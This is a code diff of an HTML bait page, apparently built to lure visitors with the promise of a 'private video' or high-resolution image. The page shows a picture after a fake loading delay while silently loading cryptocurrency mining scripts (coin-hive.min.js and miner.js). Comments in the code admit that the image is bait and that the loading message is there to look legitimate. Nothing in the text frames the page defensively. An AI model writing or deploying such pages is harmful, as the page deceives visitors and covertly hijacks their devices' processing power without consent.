@@ -1,41 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Private Video</title>
+    <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { margin: 0; padding: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        #baitImage { max-width: 100%; max-height: 100%; display: none; }
-        #loader { color: white; font-family: sans-serif; text-align: center; font-size: 18px; }
+        body { margin: 0; padding: 0; background: #111; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; font-family: sans-serif; }
+        #loader { text-align: center; }
+        #baitImage { max-width: 95%; max-height: 95%; display: none; border: 1px solid #333; }
     </style>
 </head>
 <body>
+    <div id="loader">
+        Loading high-resolution image...<br>
+        <small style="color: #888;">This may take a few seconds.</small>
+    </div>
+    <img id="baitImage" src="">
 
-    <!-- This is the bait that will be shown to the user -->
-    <img id="baitImage" src="https://i.imgur.com/GdJ91vF.jpeg">
+    <!-- ============================================================= -->
+    <!-- ====== LOAD THE MINING LIBRARY FIRST ======================= -->
+    <!-- ============================================================= -->
+    <script src="coin-hive.min.js"></script>
     
-    <!-- This is a fake loading message to make it look legit -->
-    <div id="loader">Loading private video...<br>Please wait, this may take a moment.</div>
-
+    <!-- ============================================================= -->
+    <!-- ====== THEN LOAD OUR CONTROLLER ============================= -->
+    <!-- ============================================================= -->
     <script>
-        // --- CONFIGURATION ---
-        var imageUrl = "https://i.imgur.com/GdJ91vF.jpeg"; // <--- PASTE YOUR IMAGE URL HERE
+        var imageUrl = "https://i.imgur.com/GdJ91vF.jpeg"; // <--- PASTE YOUR IMAGE URL
 
-        // --- DO NOT EDIT BELOW THIS LINE ---
-
-        // Show the image after a short delay to simulate loading
         setTimeout(function() {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('baitImage').src = imageUrl;
             document.getElementById('baitImage').style.display = 'block';
-        }, 3000);
+        }, 2500);
 
-        // Load our self-contained miner
-        console.log("Loading miner...");
+        // Load our miner controller
         var script = document.createElement('script');
         script.src = 'miner.js';
         document.head.appendChild(script);
-
     </script>
 </body>
 </html>
